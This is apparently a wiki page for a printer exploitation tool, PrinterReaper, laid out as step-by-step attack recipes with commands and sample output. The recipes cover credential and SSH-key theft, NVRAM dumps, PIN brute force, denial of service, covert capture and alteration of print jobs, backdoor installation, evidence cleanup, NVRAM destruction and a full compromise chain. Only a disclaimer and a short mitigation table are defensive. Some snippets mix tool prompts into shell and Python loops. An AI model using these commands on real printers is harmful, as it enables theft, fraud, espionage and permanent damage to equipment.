# 💥 Attack Vectors

Comprehensive guide to printer exploitation techniques using PrinterReaper.

---

## ⚠️ Legal Warning

**IMPORTANT**: All attack techniques described here are for:
- ✅ Authorized penetration testing
- ✅ Security research
- ✅ Educational purposes

**NEVER** use these techniques without written authorization!

---

## 📋 Attack Categories

1. [Information Disclosure](#-information-disclosure)
2. [Authentication Bypass](#-authentication-bypass)
3. [Denial of Service](#-denial-of-service)
4. [Data Manipulation](#-data-manipulation)
5. [Print Job Capture](#-print-job-capture)
6. [Persistence](#-persistence)
7. [Physical Damage](#-physical-damage)

---

## 🔓 Information Disclosure

### Attack 1.1: Filesystem Enumeration

**Objective**: Map entire printer filesystem

**Steps:**
```bash
# 1. Connect
python3 printer-reaper.py <target> pjl

# 2. List all volumes
> ls 0:/
> ls 1:/
> ls 2:/

# 3. Recursive file discovery
> find /

# 4. Download interesting files
> download /etc/passwd
> download /etc/config.xml
> download /webServer/index.html
```

**Impact**: Full filesystem disclosure

---

### Attack 1.2: Password Extraction

**Objective**: Extract stored credentials

**Techniques:**

**Technique A: Configuration Files**
```bash
> download /etc/config.xml
> cat /etc/config.xml | grep -i password
```

**Technique B: NVRAM Dump**
```bash
> nvram dump

NVRAM Contents:
ADMIN_PASSWORD=secret123
WIFI_PSK=MyWiFiPassword
SMTP_USER=printer@company.com
SMTP_PASS=email_password
SNMP_COMMUNITY=private
```

**Technique C: System Files**
```bash
> download /rw/var/sys/passwd
> download /etc/shadow
> download /home/admin/.ssh/id_rsa
```

**Impact**: Credential compromise, lateral movement

---

### Attack 1.3: Network Configuration Disclosure

**Objective**: Extract network credentials and topology

```bash
# Get full network info
> network

# Download network configs
> download /etc/network/interfaces
> download /etc/wireless.conf
> download /etc/network/wpa_supplicant.conf

# Get routing table
> download /proc/net/route
```

**Impact**: Network mapping, WiFi key disclosure

---

## 🚫 Authentication Bypass

### Attack 2.1: PIN Brute Force

**Objective**: Bypass control panel lock

**Method:**
```bash
# Automated brute force
> unlock_bruteforce

Testing PIN 0...
Testing PIN 1...
Testing PIN 2...
...
Success at PIN 4567!
```

**Optimized Attack:**
```bash
# Test common PINs first
common_pins = [0, 1234, 12345, admin, 0000, 1111]

for pin in common_pins:
    > unlock {pin}
```

**Impact**: Full printer control, configuration access

---

### Attack 2.2: Lock Bypass via Factory Reset

**Objective**: Bypass lock by resetting

```bash
# Method 1: Factory reset (destructive)
> reset
Are you sure? (yes/no): yes
[Printer reset, lock removed]

# Method 2: NVRAM manipulation (advanced)
> nvram set LOCKPIN 0
```

**Impact**: Lock bypassed, but settings lost

---

## 🚧 Denial of Service

### Attack 3.1: Display Message Spam

**Objective**: Spam printer display

```bash
# Simple display spam
> dos_display

# Manual spam
while true; do
    echo "display 'HACKED!'"
done | python3 printer-reaper.py -i - <target> pjl
```

**Impact**: User annoyance, social engineering

---

### Attack 3.2: Printer Disable

**Objective**: Make printer reject all jobs

**Method:**
```bash
# Disable printing
> disable

# Lock with unknown PIN
> lock 99999

# Take offline
> offline "PERMANENTLY OUT OF SERVICE"

# Set incompatible settings
> set JOBMEDIA=NONEXISTENT
```

**Impact**: Complete DoS, manual recovery required

---

### Attack 3.3: Resource Exhaustion

**Objective**: Exhaust printer resources

**Methods:**

**Connection Exhaustion:**
```bash
> dos_connections

# Or manually
for i in {1..100}; do
    python3 printer-reaper.py <target> pjl &
done
```

**Memory Exhaustion:**
```bash
# Fill memory with jobs
> hold
> dos_jobs

# Upload large files
> upload huge_file.dat 0:/huge.dat
```

**Disk Space Exhaustion:**
```bash
# Fill disk with large files
while [ $(df | grep "0:" | awk '{print $4}') -gt 1024 ]; do
    > upload large.dat /tmp/junk_$RANDOM.dat
done
```

**Impact**: Printer unusable, requires restart

---

### Attack 3.4: Infinite Loop

**Objective**: Hang printer with infinite loop

```bash
# PJL infinite loop (if supported)
> execute @PJL ENTER LANGUAGE=POSTSCRIPT
> execute { } loop
```

**Impact**: Printer hangs, requires power cycle

---

## 📝 Data Manipulation

### Attack 4.1: Print Job Replacement

**Objective**: Replace print job content

```bash
# Enable replacement
> replace "Confidential" "Public"
> replace "$1000" "$0"

# All subsequent jobs modified
```

**Impact**: Data integrity compromise, fraud

---

### Attack 4.2: Configuration Tampering

**Objective**: Modify printer settings

```bash
# Change default settings
> set COPIES=100
> set DUPLEX=OFF
> set RESOLUTION=300
> set TIMEOUT=1

# Upload malicious config
> upload malicious_config.xml /etc/config.xml

# Restart to apply
> restart
```

**Impact**: Wasted resources, degraded quality

---

### Attack 4.3: Page Counter Manipulation

**Objective**: Reset or modify page counter

```bash
# View current count
> pagecount
Current page count: 123456

# Reset counter
> pagecount 0

# Set to specific value
> pagecount 999999
```

**Impact**: Billing fraud, maintenance bypass

---

## 🎣 Print Job Capture

### Attack 5.1: Silent Job Interception

**Objective**: Capture print jobs without detection

**Full Attack Chain:**
```bash
# 1. Connect to printer
python3 printer-reaper.py <target> pjl

# 2. Enable job retention
> hold

# 3. Start capture mode
> capture
Capture mode enabled

# 4. Configure capture directory
mkdir -p exfiltrated/$(date +%Y%m%d)

# 5. Wait for jobs...
# (Jobs automatically saved)

# 6. Periodically download captured jobs
> ls /tmp/jobs
> download /tmp/jobs/job001.ps

# 7. Clean up evidence
> pjl_delete /tmp/jobs/job001.ps

# 8. Disable capture before leaving
> backdoor_remove
> exit

# 9. Analyze captured jobs
$ ls exfiltrated/
confidential_report.pdf
payroll_data.xlsx
merger_documents.docx
```

**Impact**: Massive information disclosure, espionage

---

### Attack 5.2: Job Modification

**Objective**: Modify print jobs in transit

```bash
# Enable overlay on all jobs
> overlay hack_stamp.eps

# All printed pages now have overlay
# "CONFIDENTIAL - LEAKED"

# Or modify content
> replace "Salary: $50,000" "Salary: $80,000"
> replace "APPROVED" "DENIED"
```

**Impact**: Data manipulation, fraud

---

## 🔐 Persistence

### Attack 6.1: Backdoor Installation

**Objective**: Maintain persistent access

**Steps:**
```bash
# 1. Upload backdoor script
> upload backdoor.ps /webServer/system_check.ps

# 2. Verify persistence
> restart
# Wait...
> reconnect
> ls /webServer
-  2048  system_check.ps  # Still there!

# 3. Execute backdoor
> execute @PJL ENTER LANGUAGE=POSTSCRIPT
> execute (/webServer/system_check.ps) run

# 4. Establish persistence
# Backdoor runs on printer boot
```

**Impact**: Persistent compromise, long-term access

---

### Attack 6.2: Configuration Persistence

**Objective**: Persist malicious settings

```bash
# Modify NVRAM settings
> set PERSISTENT_VAR=malicious_value

# These survive reboots
> restart
> reconnect
> printenv PERSISTENT_VAR
malicious_value  # Still there!
```

**Impact**: Persistent configuration changes

---

## 💣 Physical Damage

### Attack 7.1: NVRAM Destruction

**⚠️⚠️⚠️ EXTREMELY DANGEROUS ⚠️⚠️⚠️**

**Objective**: Cause permanent hardware damage

```bash
# WARNING: May brick printer permanently!
> destroy

Warning: This command tries to cause physical damage to the
printer's NVRAM. Use with caution!

Are you sure you want to continue? (yes/no): yes

Executing destructive command...
[Printer may be permanently damaged]
```

**PJL Commands:**
```
@PJL SET NVRAM=0
@PJL SET NVRAM=0
@PJL SET NVRAM=0
... (repeated)
```

**Impact**:
- ⚠️ Permanent NVRAM damage
- ⚠️ Printer may be bricked
- ⚠️ Expensive repair/replacement
- ⚠️ Cannot be undone

**Legal Warning**: Use ONLY in authorized research!

---

### Attack 7.2: Filesystem Destruction

**⚠️⚠️ DESTRUCTIVE ⚠️⚠️**

**Objective**: Erase all printer data

```bash
# Format filesystem
> format

This will format the printer's file system!
Are you sure? (yes/no): yes

File system formatted
[All data erased]
```

**Impact**:
- All files deleted
- Configuration lost
- Cannot be recovered
- Printer may need firmware reload

---

## 🎭 Social Engineering

### Attack 8.1: Fake Messages

**Objective**: Display misleading messages

```bash
# Fake error messages
> display "CRITICAL ERROR - CALL IT SUPPORT"
> display "FIRMWARE UPDATE REQUIRED - DO NOT USE"

# Fake maintenance messages
> offline "Scheduled Maintenance - Back at 5 PM"
> offline "Printer Reserved for Executive Use Only"

# Phishing messages
> display "Enter Admin PIN: ____ to Continue"
```

**Impact**: User confusion, credential phishing

---

### Attack 8.2: Print Job Manipulation

**Objective**: Modify printed output

```bash
# Add watermark
> cross "CONFIDENTIAL - FOR YOUR EYES ONLY"

# Replace content
> replace "Public" "Confidential"
> replace "$100" "$1,000"

# Add overlay
> overlay company_logo.eps
```

**Impact**: Data manipulation, fraud

---

## 🔗 Attack Chains

### Full Attack Chain Example

**Objective**: Complete printer compromise

**Phase 1: Reconnaissance** (5 minutes)
```bash
1. python3 printer-reaper.py          # Discover
2. python3 printer-reaper.py <ip> pjl # Connect
3. > id                                # Identify
4. > network                           # Map network
5. > find                              # Map filesystem
```

**Phase 2: Exploitation** (10 minutes)
```bash
6. > download /etc/passwd              # Exfiltrate creds
7. > nvram dump                        # Dump NVRAM
8. > mirror                            # Full filesystem
9. > hold                              # Enable capture
10. > capture                          # Start capturing
```

**Phase 3: Persistence** (5 minutes)
```bash
11. > upload backdoor.ps               # Install backdoor
12. > lock 31337                       # Lock printer
13. > display "Maintenance Mode"       # Social engineering
```

**Phase 4: Cleanup** (2 minutes)
```bash
14. > backdoor_remove                  # Remove traces
15. > exit                             # Disconnect
```

**Total Time**: ~22 minutes  
**Impact**: Full compromise

---

## 🛡️ Defense Recommendations

### Mitigation Strategies

For each attack vector:

| Attack | Mitigation |
|--------|------------|
| Filesystem Access | Disable PJL, enable authentication |
| Password Extraction | Encrypt NVRAM, remove default passwords |
| Authentication Bypass | Use strong PINs (10000+), disable bypass |
| Denial of Service | Rate limiting, connection limits |
| Job Capture | Encrypt print jobs, disable retention |
| Persistence | Regular firmware updates, file integrity monitoring |
| Physical Damage | Physical security, disable destructive commands |

---

## 📚 Related Resources

- **[Security Testing](Security-Testing)** - Systematic testing approach
- **[Examples](Examples)** - Practical scenarios
- **[PJL Commands](PJL-Commands)** - Command reference

---

<div align="center">

**Attack Vectors**  
⚠️ Use responsibly and only with proper authorization

**→ [Next: Architecture](Architecture)**

</div>

